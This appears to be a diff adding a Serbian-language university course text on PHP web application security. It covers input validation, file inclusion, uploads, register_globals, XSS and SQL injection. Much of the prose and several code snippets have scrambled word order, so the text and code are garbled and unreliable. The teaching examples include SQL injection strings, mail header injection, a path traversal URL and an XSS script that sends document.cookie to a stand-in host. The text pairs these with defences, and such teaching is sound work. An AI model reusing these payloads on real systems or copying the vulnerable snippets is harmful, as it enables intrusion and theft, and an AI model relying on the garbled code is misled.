@@ -1,0 +1,862 @@
+﻿SKRIPTA IZ TEHNOLOGIJE INTERNET PREDMETA . 
+ . 
+ 
+ . 
+ 
+ 
+ . 
+ . 
+ 
+ . 
+ 
+ . 
+ . 
+ 
+ 
+ 
+ 
+ . 
+Sigurnost i bezbednost . 
+PHP aplikacija 
+SADRŽAJ . 
+ . 
+1	Uvod . 
+sigurnosti	4 2	Osnove . 
+inputa	4 2 1	Validacija . 
+vrednosti	5 brojnih 2 1 1	Validacija . 
+teksualnih inputa	6 2 1 2	Validacija . 
+2 2	Ostali inputi	8 nesigurni . 
+2 2 1	Priključenje skripti	8 . 
+2.2.2	Upload fajlova	9 
+3	Nesigurna platforma	10 
+globalnih promenjivih	10 3 1	Registracija . 
+za (magic_quotes_gpc)	12 i navodnici COOKIE POST GET, 3 2	Magični . 
+4	Cross Site Scripting (XSS)	13 
+entiteti	13 4 1	HTML . 
+4.2	Izbacivanje HTML tagova	14 
+5	SQL Injection	15 
+5 1	Zaštita	15 . 
+5.1.1	mysql_real_escape_string()	16 
+(Prepared 5 1 2	Pripremljeni statements)	16 izrazi . 
+6	Sesije	18 . 
+6 1	Fiksacija Fixation)	19 (Session sesija . 
+6.2	Otmica sesija (Session Hijacking)	19 
+7	Autentifikacija i autorizacija korisnika	20 
+hashing	20 7 1	Password . 
+7 2	Brute force	21 . 
+7.2.1	Zabrana pristupa preko IP adrese	21 
+održavanje 7 3	Dugotrajno sesija	22 . 
+8	Upravljanje greškama	23 . 
+9	Opšte za aplikacija	25 web preporuke sigurnost . 
+ . 
+Uvod . 
+PHP programski jezik je jedan od najpopularnijih web programskih jezika današnjice. 
+Kranje je fleksibilan, relativno je jednostavan i prijateljski je naklonjen programerima početnicima. 
+Uz samo malo znanja svako može kreirati svoj kontakt formular, knjigu gostiju, mejling listu ili čak veoma ozbiljnu, dinamičnu web aplikaciju. 
+najvažniji mnogi na aspekt sigurnost  web Međutim, programiranja obraćaju ne programeri – pažnju . 
+ . 
+Prva asocijacija na sigurnost je svakako uspešna zaštita od hakerskih napada. 
+Ciljevi ovakvih napada mogu biti raznovrsni, kao i tipovi aplikacija koje pravimo, ali se, generalno, kao cilj svakog hakerskog napada može smatrati, sa jedne strane, stvaranje materijalne ili nematerijalne štete celokupnom sistemu, a sa druge, stvaranje materijalne ili nematrijalne dobiti samog napadača. 
+da ukrade korisnika bazu sa tu nam strane, a neku ukoliko iskoristi sigurno štetu, našu može za Konkretno, bazu je korisnika dobijanje naneo materijalne napadač druge koristi  . 
+ . 
+aplikacije od nije mogu nepredviđene samo napada, već hakerskih namernih zaštita web izazvati i akcija Međutim, i korisničkih od sigurnost nenamerniih koje greške  aplikacije zaštita . 
+napad, hakeri greške za pa mogu na zlonamerni u mogu samim da bilo pogled bezazlene aplikaciji sigurnosne kakvu Lukavi i iskoriste prvi svakako potencijalni propuste  grešku i predstavljati tim . 
+i ako neke greške ne moraju predstavljati opasnost po samu aplikaciju ili podatke, samo po sebi, ukoliko nešto ne radi očekivano – nije dobro. 
+predvide skripte upoznaju studenti ove bezbednosti moguće uspešno rizike web jedne da da aplikacije, da ukone  se je ih Cilj i sa sigurnosne osnovama . 
+sesija najčeće podataka, sigurnost su: procesiranje i baze korišćenih programiranju, sigurnosti autorizacije korisnika  formulara, kao se bazira Sadržaj u na web što metoda sigurnost . 
+Takođe, daje i primere tipa „best practice“ kojih bi se trebalo pridžavati. 
+zlonamerne u iskorišćeni ne Svi treba budu edukativnog nikako svrhe  u karaktera ovoj primeri i su skripti da . 
+ 
+sigurnosti Osnove . 
+izvrši u napisana zahteve korisnika  aplikacije da web cilju je Svaka . 
+Ti "pošalji koje i me", podaci biti ili "prikaži sve napisani "uloguj aplikaciji  odnosno mogu stranicu" zahtevi mail" ili komande korisnik mi šalje . 
+Interpretiranje tih komandi i podataka je osnovna delatnost aplikacije, a baš u toj interpretaciji leže najveći sigurnosni rizici.  
+ 
+mogu poslati šalju aplikaciji nazivaju i Komande putem: i biti se se inputi podaci koji . 
+URL adrese . 
+HTML formulara 
+Kolačića (cookie) 
+parametara Header . 
+U web sigurnosti važi opšte pravilo da "korisniku nikada ne treba verovati", pa tako ukoliko se od njega zahteva da unese svoju email adresu, ne mora baš značiti da će on to uraditi. 
+koja podataka iskoristiti će za slanje komandu celu bazu ili SPAM obrisati server poruka  Može neku masovnih uneti . 
+Validacija inputa . 
+rečeno, i kreiranju najveći komandi pa zadatak aplikacije  stoga podataka sugurnosni propusti sigurnosni već tih u najveći је leže interpretaciji u validacija predstavlja što Kao web inputa, . 
+omogućava sa da sve podatke  odbace se ispravnim da realnim Ujedno, odnosno i radi inputa podacima, nepotrebne validacija ose . 
+– sa ispravnim primer je samo ili podacima, da kreiranje imati 100 sa mejling korisnika za Uzmimo neispravnim? li bolje liste 10 000 . 
+Ili JavaScript naneti korisnicima  štetu mogu koje sadrže zamislite koji komentara da na sadržaja se 100 linkove nađe kompanijskom SPAM maliciozne kodove pornografskog ili blogu do . 
+ 
+kao faktor, nastale ulogu poslovanje, i dragoceno svega, se odigrava kreiranje inputa, štete  da možda izgubio samo sigurnosni omogućava već novac pre ne vreme čuva imidža dobrog koje uspešno bi validacija ispravljajući Dakle, i značaju . 
+ . 
+su kao oni (tekstualne da samo su vrednost), i svi tako stringovi one dalje inputi prikazane su brojne vrednosti da stringovi  treba tehičke Sa ako i u vidu imati strane, . 
+PHP ima tu mogućnost da radi sa različitim tipovima podataka i da ih menja dinamično, u hodu. 
+možemo Pa deklarišemo sabrati promenjivu sadrži koja ako sa nju "23", kojim  bilo brojem  stringovnu vrednost tako . 
+<?php . 
+razlikuje $broj "23" $broj = 23; // od se = . 
+$novi_broj 3; + = $broj 26 // . 
+?> 
+ . 
+Ovaj kôd nikako ne predstavlja sigurnosni rizik, već samo jednu karakteristiku PHP-a, dobri programeri uvek moraju imati na umu sa kakvim tipovima podataka rade. 
+jedna od je To pa redom  inputa, validacije krenimo pravilne osnova . 
+ 
+Validacija brojnih vrednosti 
+radimo veoma brojnih podacima ispravnim povećamo je i sa i da omogućava sigurnost vrednosti aplikacije  jednostavna veoma naše PHP da nam i Validacija jednostavno . 
+nismo ukoliko SQL radu parametra, se koja "dohvatanje" napadač sigurnost je greške aplikacije  aplikacije, proizvodu odnosno upita jeste), proverili na komande, i ispisuje radi parametru i samog ID odnosno i brojčana najvećim da lako čak imamo (u informacije pa ukoliko proizvodu Konkretno, o za može ID koji zaista informacija zadatog injection, izmenu vrednost u o ugroziti stranicu osnovu slučajevima o tako izazvati URL . 
+ Primer takvog kôda može izgledati ovako: 
+<?php . 
+// www.example.com/proizvod.php?id=15';DELETE FROM proizvodi;-- 
+$_GET['id']; = $id . 
+ . 
+FROM * id= '$id'"; proizvodi $sql WHERE = "SELECT . 
+//    . 
+?> . 
+je se umesto $sql bi bi upita da jednog, dva izgledala ovako: Jasno promenjiva izvršila i . 
+SELECT * FROM proizvodi WHERE id = '15'; DELETE FROM proizvodi; --' 
+odnosno bi bila ID parametra, inputa, jednostavna  Validacija ovakvog . 
+nepostojeću zaista u ostalim osigura da parametar samo odnosno uneti se je broj, da Trebalo grešku, bi slučajevima prikažemo da stranu  a . 
+može se Za iskoristiti is_numeric() funkciju  tu svrhu . 
+{ if(!is_numeric($_GET['id'])) . 
+	// prikaži stranicu 404 . 
+} . 
+podataka, je bolji način menjanje tipa  odnosno Međutim, kastovanje . 
+Na ovaj način definitivno se osigurava rad sa pravim tipom podatka. 
+(int) = $_GET['id'] $id . 
+{ 0) == if($id . 
+	// prikaži 404 stranu 
+} . 
+ovakvim slučajevima: u Sledeći ujedno je primer practice" kôd "best za  i . 
+ . 
+FROM www example com/proizvod php?id=15';DELETE proizvodi;-- // . 
+ 
+// Prvo proveramo da li je uopšte zadat obezan parametar 
+{ if(empty($_GET['id'])) . 
+404 	// prikaži . 
+} . 
+ . 
+// kastovanje . 
+15 // $id = $_GET['id']; (int) . 
+ . 
+// optimizacija: sprečavamo nepotreban upit 
+<= 0) { if($id . 
+	// prikaži 404 
+} . 
+ . 
+siguran sada // je upit . 
+FROM proizvodi id= $sql = '$id'"; * "SELECT WHERE . 
+ 
+//    . 
+?> . 
+podržavaju  izvršenje ih odjednom, PostgreSQL  i ali dozvoljava ne upita za više Napomena: mysql_query() SQLite drzajveri . 
+imati upit, Savet: ukoliko treba imati  ni Operacije pa nije i najskuplje, su tako bazom sa podataka ne neki ga vremena neophodo memorije, u smislu . 
+Ovaj primer odlično opisuje da ne treba izvršiti upit ukoliko je $id manji ili jednak nuli, jer u našoj bazi verovatno i nećemo imati proizvod sa tim ID.  
+inputa teksualnih Validacija . 
+Dok filtriranje je jednostavno, nijansu inputa je filtriranje brojeva tekstualnih relativno za komplikovanije  . 
+postojeće prostije neke možemo broj, i formate PHP već su funkcije  što poštanski slični inputa, Za koristiti kao telefon, adresa email . 
+Ali, pre detaljnog objašnjena, sledeći primer odlično prikazuje važnost filtriranje inputa. 
+Ukoliko bismo imali jednostavnu kontakt formu, koju korisnik popunjava svojim ličnim podacima, email adresom i komentarom, jednostavna skripta koja bi izvršavala tu kontakt formu i slala podatke na našu email adresu bi mogla da izgleda ovako: 
+ 
+<?php . 
+forme podaci sa // . 
+= $_POST['ime']; $ime . 
+$email $_POST['email']; = . 
+$tekst = $_POST['tekst']; . 
+ 
+u za // pošaljioca mail Heder klijentu ispis . 
+<$email> $ime "From: \n\r"; $heder = . 
+ . 
+našu // slanje na adresu email-a . 
+$tekst, $heder); mail('kontakt@example com', . 
+?> . 
+korisniku samo Ova zaista će očekivano, raditi ukoliko da će svakako ispravne uneti ali podatke  skripta verujemo . 
+Pošto mu ne smemo verovati, napadač veoma lako može iskoristiti ovakvu skriptu za slanje SPAM poruka sa našeg servera. 
+Dovoljno je da umesto svog imena, ili email adrese unese nešto ovako: 
+ . 
+<example3@example com example@example com> \n\r To: \n\r Bcc: <example2@example com> . 
+je želi  poslata $header, i da će napadač adresa se iz Jasno onoliko će na da biti u poruka direktno $email vrednost koliko kopirati . 
+Važnost zaštite u ovom slučaju je veoma velika, Svakako nije poželjno da se sa našeg servera šalju SPAM poruke, zbog kojih možemo biti označeni kao maliciozni i završiti na nekoj "crnoj listi".  
+Još jednom, rešenje ovog i mnogih drugih problema, leži u filtriranju inputa. 
+ . 
+funkcije Ctype . 
+ . 
+i mogućnosti, Character pritom performanse  type a imaju odlične odlične imaju funkcije . 
+Ove funkcije, proveravaju svaki karakter i rezultat će biti TRUE jedino ako svaki karakter zadovoljava postavljeni kriterijum. 
+ukoliko nedozvoljenog će U karakter biti FALSE  rezultat je suprotom, tipa, . 
+Funkcija 
+Opis . 
+ . 
+ctype_alnum 
+brojnih slovnih Provera karaktera i . 
+ . 
+ctype_alpha . 
+Provera slovnih karaktera 
+ . 
+ctype_digit . 
+karaktera Provera brojnih . 
+ 
+ctype_lower . 
+slova Provera malih . 
+ . 
+ctype_upper . 
+velikih slova Provera . 
+ 
+Tabela najčešće korišćenih ctype funkcija 
+funkcija: Ctype korišćenja Primeri . 
+ctype_alpha("Pera"); true // . 
+false // ctype_alpha("Pera1); . 
+ctype_alnum("Pera1"); // true . 
+ . 
+Filter funkcije 
+ 
+ga da – odgovara ili (sanitization) kriterijumima dve po kriterijumima  Filter provere ne (validate) string isprave imaju mogućnosti postavljenim ukoliko funkcije da . 
+samo svoju široku je Svakako ispravljanje ali ima preporučljivo primenu  validaciju, i koristi . 
+filter_var($var, $filter) 
+drugi kriterijume a proverava, za kriterijume: atribut koja je predstavlja a vrednost najčešće Prvi proveru, korišćene se tabela predstavlja sledeća . 
+Filter . 
+Opis . 
+ . 
+FILTER_VALIDATE_EMAIL . 
+Provera email adrese . 
+ 
+FILTER_VALIDATE_INT . 
+min_range Provera opcijama brojnih vrednosti, i max_range sa . 
+ . 
+FILTER_VALIDATE_IP . 
+adrese IP Provera . 
+ . 
+FILTER_VALIDATE_URL . 
+Provera URL adrese ispravne . 
+ 
+validaciju prikazuje email pravilnu Sledeći adrese  primer . 
+pređašnji SPAM i poruka: predstavlja je koji slanje omogućavao rešenje Takođe, masovnig za primer . 
+<?php . 
+$_POST['email']; $email = . 
+ 
+if(filter_var($email, FILTER_VALIDATE_EMAIL)) { . 
+mail 	// je sada sigurno poslati . 
+} . 
+?> . 
+ . 
+Regularni izrazi (regular expression, regex) 
+ . 
+pravila i/ili izrazi objektu  u određenim znakovnih tekstualnom Regularni skupova cilju podacima su skup izvršavaju identifikacije nekom karaktera koji u nad se . 
+svi izraze relativno koriste performanse jezici, Regularne programski široku primenjivost  dobre imaju i . 
+funkcije izraze: koriste korišćene regularne prikazuje često Sledeća koje PHP tabela . 
+Funkcija . 
+Opis . 
+ . 
+preg_match . 
+regex proveru nad podacima Izvršava . 
+ . 
+preg_match_all . 
+na  rezultate niz, postavlja regex i osnovu na u podatke osnovu zadatih Pretražuje pravila . 
+ 
+preg_replace . 
+Pretražuje podatke na podacima drugim regex pogotke zamenjuje osnovu sa i . 
+ 
+biće prikazani izrazi Pošto i korišćeni izrazi podataka: njihovo tema regularni najšeće funkcionisanje nije samo kursa, proveri ovog u . 
+ . 
+<?php . 
+za proveru email adrese izraz // . 
+$regex = '/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/'; 
+ . 
+if(preg_match($regex, { $email)) . 
+email adresa 	// ispavna . 
+} 
+?> 
+zanimljivih U regularnih i su par korišćeni sledećoj dati izraza tabeli često . 
+Izraz . 
+Opis 
+ . 
+/^[a-z]*$/ . 
+slova u z Sva slova od mala a intervalu do . 
+ . 
+/^[a-zA-Z0-9]*$/ 
+brojni znakovi brojevi) Slovni slova (mala i velika i i . 
+ . 
+/^[a-fA-F0-9]{32}$/ . 
+vrednosti md5 Format hash . 
+ 
+/^(5[1-5][0-9]{14})*$/ . 
+kreditne Format Master  kartice . 
+ . 
+/^(4[0-9]{12}(?:[0-9]{3})?)*$/ 
+kreditne kartice Visa Format . 
+ . 
+ . 
+Ostali nesigurni inputi 
+jer se PHP sigurnosti U inputa validaciji pažnje aplikacije  to dosta posvećuje svakako pravilnoj svake ovoj skripti osnova je . 
+U ovom poglavlju će biti objašnjeni konkretni propusti koji nemaju direktne veze sa podacima, ali mogu da predstavljaju veoma ozbiljne sigurnosne rizike. 
+skripti Priključenje . 
+skripte, zavisnosti datoteke Na URL ukoliko dozvoljene Veoma samo priključujemo da rizik module  u ili različite se radi primer, aplikacija što naša nismo dešava parametara ispisujemo priključuje određene teksualne ukoliko često sigurnosni ograničili priključi korisniku da može tako module, pojavit se od različite . 
+takvog Primer kôda: jednog . 
+ . 
+<?php . 
+// www example com/index php?module=contact . 
+ . 
+{ if(isset($_GET['module'])) . 
+	include $_GET['module']  ' php'; 'modules/'  . 
+} . 
+?> . 
+ 
+Napadač bi u ovom slučaju mogao da priključi bilo koju skriptu, pa čak i skripte koje se ne nalaze u modules/ direktorijumu  ukoliko bi module parametar izmenio u nešto poput ovoga:  
+www example com/index php?module=  /config // . 
+i config php jer skripta biti nepravilno podaci jeste ovo izvršiti ne prikazani, Primer prvi predstavlja sigurnosni na ali ovog osetljivi će svakako pogled propust aplikacije  koda korišćenje se neće . 
+template Veći pažnju bi na filtriranje na primer tekstualnih obratiti se skripta kada treba ovakva inputa  svakako koristila fajlova, ispis HTML tipa ovakvog rizik bio fajlova, pa – za bi . 
+Rešenje bi bilo da se omogući priključenje samo onih skripti koje smo mi odredili. 
+baš primer to: radi Sledeći kôda . 
+<?php . 
+Niz modulima // sa dozvoljenim . 
+array('contact', $modules 'questbook'); = 'about', . 
+{ if(isset($_GET['module']) $modules)) && in_array($_GET['module'], . 
+$_GET['module'] 'modules/'  	include  ' php'; . 
+} . 
+Upload fajlova 
+Programeri često prave grešku zato što ne proveravaju ekstenziju fajla kada omogućavaju korisnicima da pošalju svoje slike i druga dokumenta koja se čuvaju na serveru. 
+Ukoliko bi na ovakvom sistemu napadač poslao i izvršio PHP skriptu kojom može da se kreće po fajl sistemu, bez problema bi mogao videti kôd bilo koje skripte, pa čak dobiti podatke za pristup bazi. 
+ukoliko osigurajte da veoma ne upload ime će promeniti php želite samo dozvolite slična te fajla  one primeru, izvršiti je što mogu Zaštita skripti, extenzije, tako da sigurne gornjem se dozvolite ili . 
+ . 
+sadržaj isključena zapravo je direktiva Takođe, je ovo ko nalaze svih hostingu, od problema se pogledati može (a ukoliko velikih deljenom fajlova koji bilo safe_mode jedan uglavnom na serveru  jeste), . 
+Sledeći primer predstavlja "best pratice" za upload datoteka i osigurava da će biti uploadovani samo omogućeni formati: 
+ 
+<?php 
+Da poslato? li je // nešto . 
+{ if(!isset($_FILES["file"])) . 
+poslata"); 	exit("Datoteka nije . 
+} . 
+ . 
+// datoteka koja je poslata preko formulara 
+$temp = $_FILES["file"]["tmp_name"]; 
+$_FILES["file"]["name"]; = $name . 
+ . 
+tipovima dozvoljenim datoteka // niz sa . 
+' pdf'); ' jpg', = array(' jpeg', ' doc', $allowed ' png', . 
+datoteke ekstenzija // . 
+= $ext strrchr($name, ' '); . 
+ . 
+&& if(in_array($ext, is_uploaded_file($temp)) { $allowed) . 
+OK je sve 	// . 
+	move_uploaded_file($temp, "dokumenti/$name"); . 
+} else { 
+greška ili slanju "); pri 	exit("Nedozvoljen datoteke tip . 
+} . 
+ . 
+?> 
+$name))  strrchr je metode da za zajedno funkcija  tačkom, primer međutim koristiti mogu dobijanje na ekstenzije korišćena i se Primetićuje sa kao se druge end(explode(' ', . 
+obavezanu i je datoteka zaista li is_uploaded_file Da sigurnosnu proveru  funkcije radi pomoću se uploadovana predstavlja . 
+Nesigurna platforma . 
+samoj mnogim platforma programeri internet upućene prave kritike videti nesigurna, mogu PHP i platformi, propusta svojom je greške  Na da sami veoma da da čini sigurnosnih prepuna ka lakoćom se odnosno stranama . 
+Ali, PHP može biti siguran kao bilo koji drugi jezik ukoliko se poštuju osnovna pravila sigurnosti. 
+Ako se uzmu za primer neki  od najpopularnijih sajtova današnjice, kao na primer Facebook, koji su napisani u PHP-u i veoma su sigurni.  
+ . 
+veoma ne u Sigurnosni su meta su česta pojava, platformi česta propusti tako ali napada  . 
+operativni i broju modul, server aplikacije  nalaze sistem Linux kome koda u najvećem Apache i PHP (open-source), slučajeva otvorenog naše kao on web i na je je kao se čiji . 
+strana lako greške koda zajednici se i otvorenog sam je Svetla i što rešavaju  otkrivaju softveru dostupan široj aplikacija kôd tim u je samim . 
+softveru dozvoljen u mogu kôd i je koji strana je programerima taj iskoristiti za Tamna greške zlonamernim da napad  eventualni . 
+verzijama verziju u nalazi rešeni naša aplikacija serveru i dalje se ako sadrži  problem dalje na propusti platformi stariju poznati I koristi i postoji su softvera, softvera ukoliko na sigurnosni koji sistema operativnog svi najnovijim koji i . 
+ . 
+Svakako, ukoliko imamo kontrolu nad serverom, moralo bi se uvek da voditi računa da nam je softver "up to date". 
+razloga i nekih stare jer Kontrola verzijama verzije dalje nad koriste naše sofvera  zbog web moguća, provajdera, unajmljenog aplikacije često kod nalaziti ili hosting će drugih se softverom nije starijim koji aplikacija kompatibilnosti sa . 
+u tržištu sigurnosnih rešeni PHP na sadrži su verzijama  dosta kasnijim relativno Mnogi na koriste 4 koji propusta svojim koji serverima dalje i . 
+ 
+opcija, provajdera, redovno i situacijama pažnju računa voditi održavan obavezno softver uvek usluge privatni proverene odabrati je bekapu  hosting na samo je Dakle, hosting potrebno redovnom suprotim obratiti i u o odlična . 
+PHP je okolnostima, on dosta su projekat u pisan sami izjavili, da pijanom "pod sadži ponekad njegovi programeri i ne-sigurnih je open takav rečeno, mnogim kako Kao je i source stanju", funkcionalnosti  kao što . 
+Registracija globalnih promenjivih 
+Svakako jedan od najnesigurnijih propusta je register_globals direktiva koja je u današnjim verzijama PHP-a podrazumevano isključena, ali se programeri i dalje veoma često susreću sa ovim problemom. 
+sebi i i komatibilnosti hosting starijim ovaj Mnogi rešenja po dobrih rešiti sa ovu koje provajderi da jednostavno dalje ponekad, drugog problem  navika steknemo aplikacijama zbog direktivu same će nemamo uključenom par osim drže . 
+register_globals je direktiva koja omogućuje registrovanje globalnih promenjivih, odnosno promenjive poslate POST, GET i cookie metodama mogu se direktno koristiti u kôdu. 
+opisuje: Sledeći primer to . 
+ . 
+<?php 
+url: 	// www example com/index php?ime=Pera . 
+	echo Pera $ime; // . 
+?> 
+ 
+opcija, ako koristi zapravo najvećih se I jedan rizika veoma način  sigurnosnih pravilno, predstavlja ne ukoliko korisna naizgled siguran od ona na . 
+Primer koji opisuje sigurnosni propust: 
+<?php . 
+koja administratoraif(proveriAdministratora()) // proverava autorizaciju Pozivamo funkciju { . 
+	$admin = true;} 
+// Ukoliko je admin, prikazujemo mu opcije 
+suprotnom // login { u stranuif($admin) . 
+'admin php'; 	include . 
+} else { 
+'login php'; 	include . 
+}?> 
+Jasno promenjiva priključiti admin php će ukoliko je URL adresi priključi kôd da skriptu ?admin=1  se ovaj . 
+Ili, primer sa skriptom za brisanje korisnika: 
+<?php 
+korisnici // koji brišu se . 
+$korisnici[] = 5; 
+= 6; $korisnici[] . 
+ . 
+korisnika Brisanje // . 
+foreach ($korisnici as $id) { 
+= FROM korisnici 	mysql_query("DELETE $id"); KorisnikId WHERE . 
+} . 
+- ?korisnici[]=7&korisnici[]=8 dodatni lako ubaciti korisnici može se Takođe, veoma . 
+ . 
+ovog problema: Rešenja . 
+promenjive im inicijalizovati je vrednost preporučljivo prethodno uvek dodeliti Obavezno i i default . 
+<?php 
+// Primer za autorizaciju 
+false; $admin = . 
+if(proveriAdministratora()) { ... } 
+ 
+brisanje Primer // za korisnika . 
+array(); $korisnici = . 
+$korisnici[] = 5; 
+?> . 
+$COOKIE  i $_GET, promenjive i $_POST globalne super register_globals Isključiti  koristite . 
+Ovo naravno važi samo u slučaju da imate privilegije ili kontrolu nad serverom. 
+Postoji više načina da se isključi: 
+u php.ini setovati dodati/izmeniti na register_globals = false 
+fajlu dodati: php_value  htaccess on u register_globals . 
+primer: konstante, Koristiti na . 
+<?php . 
+define("ADMIN", proveriAdministratora()); 
+ . 
+if(ADMIN) { ... } 
+?> . 
+ . 
+verzije funkcije  totalno 6, PHP iz kao mnoge ova u druge i Imajte nesigurne je izbačena vidu da direktiva . 
+ne pod Nikako se treba direktivom  mogućnost i na ne razvijati raditi ovu samo aplikaciju koja ovom će oslanjati . 
+Magični COOKIE za (magic_quotes_gpc) i POST GET, navodnici . 
+PHP brojne magic_quotes_gpc koja i je Pokušaj zaustave incjection-e hosting je defaultu  probleme filtriranja SQL oko reše inputa izrodio servera programera direktivu na po globalno većini uključena da . 
+radi odnosno još dodaje "escape" i GET, Radi promenjivima se dvostrukih "\" globalnim navodnika da POST i karaktera  nekih PHP ispred jednostrukih, automatski nad o tome specijalnih COOKIE, . 
+ . 
+U radu sa MySQL bazom, uvek je potrebno raditi escape karaktera. 
+Ukoliko je ova direktiva uključena i nije proverena pre upisa vrednosti u bazu, bićemo u situaciji da imamo dvostruko escapovane podatke – što dovodi do problema sa podacima. 
+ 
+<?php 
+// Kada je magic_quotes_gpc uključen 
+// Traženi url www.example.com/index.php?date=test' 
+test\' echo $_GET['data']; // . 
+ 
+escapovanje karaktera DB upisu // u Dvostruko pri . 
+echo mysql_real_escape_string($_GET['data']); // test\\\' 
+ . 
+?> 
+magic_quotes_gpc slash-eva  da normalizuju uklanjanjem isključi podaci se to se je je da ukoliko tih Preporučeno moguće dodatnih ili . 
+Uklanjanje se funkcijom stripslashes  vrši . 
+ . 
+<?php . 
+// Normalizacija podataka 
+{ (get_magic_quotes_gpc()) if . 
+= stripslashes($_POST['kljuc']); 	$_POST['kljuc'] . 
+} 
+?> . 
+ . 
+Važna napomena je da je magic_quotes_gpc izbačen iz PHP 5.3 verzije, kao i većina drugih funkcionalnosti koji mogu predstavljati sigurnosni propust. 
+ . 
+Cross Site Scripting (XSS) 
+aplikacije tip je sigurnosnih web je za ubaci klijentskoj izvršava web našu kôd HTML) ActiveX, (JavaScript, se u na stranicu  karakterističan propusta strani omogućava napadaču da XSS koji koji koji . 
+se bilo koda odvođenje na dobijanje drugi cilj kao korisničke može što drugu podataka stranicu ovakvog (cookie), na osetljivih sesije koji korisničkoj napada ili strani  su postići Cilj izvršenjem je koji . 
+ . 
+web primer: i na – aplikacije koje druge  forumi, sadržaj korisnički najčešće XSS-u gostiju, su ispisuju podložne članova komentari knjige . 
+ . 
+stranicu opisuje Sledeći na članova  ispisuje komentare XSS primer napad koja . 
+Ukoliko bi imali formu za upis komentara sličnu ovoj: 
+ . 
+<form /> action="komentar php" method="POST" . 
+    Vaše ime: <input type="text" name="ime" /><br /> 
+cols="60"></textarea><br /> <textarea rows="10"   name="komentar"   Komentar: . 
+value="Upišite <input  komentar"  type="submit" />   . 
+</form> . 
+ . 
+ispisuje skriptu PHP koja komentar i . 
+<?php . 
+echo "<p>$ime je napisao:<br />"; . 
+echo $komentar ."</p>"; 
+?> 
+definitivno bi postojao ozbiljan sigurnosni propust. 
+i JavaScript drugih HTML neće biti vidljiv može i koji Korisnik komentar, strane dodati ali upisati od korisnika  . 
+Komentar sa kojim napadač može ukrasti podatke o sesiji, koji se čuvaju u cookiu je sledeći: 
+ . 
+<script> . 
+	document location = + 'http://www example com/ukradi php?kolacic=' . 
+      document cookie . 
+</script> 
+korisnik posetio adresu  drugu kôdom, komentar bi biće ovim preusmeren koja na sadrži sa bilo koji Ako stranu, ovu . 
+preko neki sajt, drugi korisnici kolačićima našim samo napadač Ne da svi već metode  na će naši GET će otići pristupi da moći . 
+različitih postoji rešenja potreba, koje od više funkcija U zavisnosti pomoći  nam više PHP naših i mogu . 
+entiteti HTML . 
+Jedno od rešenja za XSS je da se specijani HTML karakteri (<, >, ', ", &)  konvertuju u njihove tekstualne entitete (&lt;, &gt;, &apos;, &quot;, &amp; ) i tako možemo biti sigurni da će HTML kôd biti ispisan onako kako je unet, pa tako i JavaScript neće biti izvšen. 
+ . 
+PHP poseduje dve funkcije koje konvertuju HTML tagove u entitete. 
+Jedna od njih je htmlspecialchars koja konvertuje gore navedene HTML tagove u odgovarajuće entitete: 
+<?php$komentar = htmlspecialchars("<a href='test'>Test</a>", ENT_QUOTES);echo $komentar; // &lt;a href=&#039;test&#039;&gt;Test&lt;/a&gt;?> . 
+našu za skriptu ispis zaštita Odnosno, komentara bi za bila:  . 
+<?php . 
+// konvertovanje outputa 
+= $ime htmlspecialchars($ime); . 
+$komentar = htmlspecialchars($komentar); 
+ . 
+napisao:<br echo />"; "<p>$ime je . 
+echo $komentar  "</p>"; . 
+?> . 
+Druga funkcija je htmlentities koja konvertuje sve specijalne karaktere u svoje entitete, kao što su ©, », € i druge.  
+Izbacivanje HTML tagova 
+Drugi način sprečavanja XSS-a je izbacivanje HTML tagova iz komentara. 
+je tekst  funkcija jednostavna – jednostavno ostavlja vrlo HTML i ovo koja sve Za strip_tags čist potrebna PHP briše i tagove . 
+ . 
+">Link</a>';echo strip_tags($komentar); paragrafu </p><!-- Komentar --> <a href="# <?php$komentar = '<p>Tekst u . 
+?> 
+slučaju, biti ovom biće html sledeći i izbačeni svi tagovi U ispisan samo će tekst: . 
+u paragrafu  Tekst . 
+Link . 
+strip_tags ima još jednu mogućnost, a to je da izostavi tagove koje ne želimo da izbacimo. 
+na primer: Na kao teksta, koristiti: i da primer, ukoliko jednostvno bold, em sl, koriste formatiranje korisnicima možemo želimo da omogućimo . 
+strip_tags($komentar, '<strong><em><u>'); . 
+sličnih, predstavljati korišćenjem kojeg Međutim, JavaScript moramo uzeti da taga, obzir onClick pa izvršiti unutar u može ovakvo stoga filtriranje sigurnosni onLoad rizik  bilo atributa i može se ili . 
+ . 
+Injection SQL . 
+XSS indirektan Dok napad PHP na odnosno napad predstavlja aplikaciju, na predstavlja korisnike, SQL podataka  Injection na bazu direktan . 
+Cilj ovog napada je da se izmeni određeni SQL upit kako bi se izvršile razne akcije, od dobijanja aletrantivnih podataka, do izmene ili brisanja podataka iz baze podataka.  
+ . 
+provere za SQL uvek tako autentifikacije imena proveru prilikom da izvršio odnosno se o i korisniku  skripte Napad na podatke kako korisnika, nekom vrši bi uvek korisničkog Injection-om upit se i SQL uglavnom "dohvata" lozinke, izmenio . 
+primer Sledeći demonstrira provere prilikom propust korisničkih podataka: . 
+ . 
+<?php 
+// forme login podaci sa . 
+$_POST['username']; = $username . 
+$password = $_POST['password']; 
+ 
+provera // podataka . 
+$sql = "SELECT * FROM korisnici WHERE username = '$username' AND password = '$password'"; 
+$result = mysql_query($sql); . 
+> 0) { if(mysql_num_rows($result) . 
+ulogovan    	// je korisnik . 
+} . 
+?> . 
+ . 
+se ovako: Ukoliko izvršio lozinke a' umesto izgledao koji  SQL formular sledeću '1'='1, i bi bi login uneo vrednost: ovakav napadač OR imena korisničkog upit u bi . 
+'1'='1' 'a' username OR WHERE = * = '1'='1' FROM korisnici SELECT OR 'a' AND password . 
+bude da bi upit primeru sigurno ulogovan  o nekom vratio konkretnom i korisniku, podatke ovom omogućio korisniku u bi Ovakav . 
+nekih biti velika primer postoji ID-a, = drugog Dodavanjem uslova, sistema  ili će još na id '1' autorizovan nekog da verovatnoća administrator  WHERE kao . 
+ . 
+može druge zlonamerne se ili iskoristiti zlonamerne akcije  upita kod svrhe, jedan Osim a neke njih podatke autentifikacije, druge može je ubacivanje dodatnog koji od uništiti i provere u . 
+SQL upita: Sledeći izvršenja demonstrira injection primer cilju u dodatnog . 
+ubacivanje dodatnog // upita . 
+"Pera'; korisnici”; = $name DELETE FROM . 
+WHERE name='$name'"); mysql_query("SELECT korisnici FROM * . 
